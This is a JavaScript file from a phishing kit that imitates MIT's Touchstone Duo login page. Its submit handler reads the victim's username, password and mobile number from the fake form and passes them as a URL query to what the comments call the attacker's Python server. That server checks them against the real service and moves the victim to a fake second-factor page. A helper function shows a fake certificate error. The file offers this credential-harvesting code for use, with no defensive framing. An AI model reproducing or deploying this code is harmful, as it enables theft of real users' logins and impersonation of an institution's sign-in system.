// On Click handler to when user submits his creds in the form
function submitDUO() {

    // clear cookies so that they get refreshed by server
    document.cookie = "";

    // extract creds
    var user = document.getElementsByName("j_username")[0].value;
    var pass = document.getElementsByName("j_password")[0].value;
    var mobile = document.getElementsByName("mobile")[0].value;
    if (user == "" || pass == "") { invalidCreds(); return false }

    // This will make a get request to the attacker's python server and 
    // will get handled in SilentHTTPSServer. Using DuoAuth, the creds
    // will be evaluated with mechanize browser. If they are valid, 
    // server will redirect user to duo-2.html or its mobile equivalent.
    // 
    // If creds are invalid, user will set ContentType
    setTimeout(function() {
        window.postMessage({
            move : '/login?'
                    + 'j_username=' + user 
                    + '&j_password='+ pass 
                    + '&mobile='    + mobile,
            url  : '/idp/Authn/UsernamePassword',
            icon : '/idp/Authn/images/favicon2.ico',
            title: 'Touchstone@MIT - Duo Authentication',
            load : '2'
        }, '*');
    }, 100);
}

function certificate() {
    setTimeout(function() {
        document.getElementById("passerr").style.display = "none";
        document.getElementById("certerr").style.display = "block";
        document.documentElement.scrollTop = 0;
    }, 500);
}
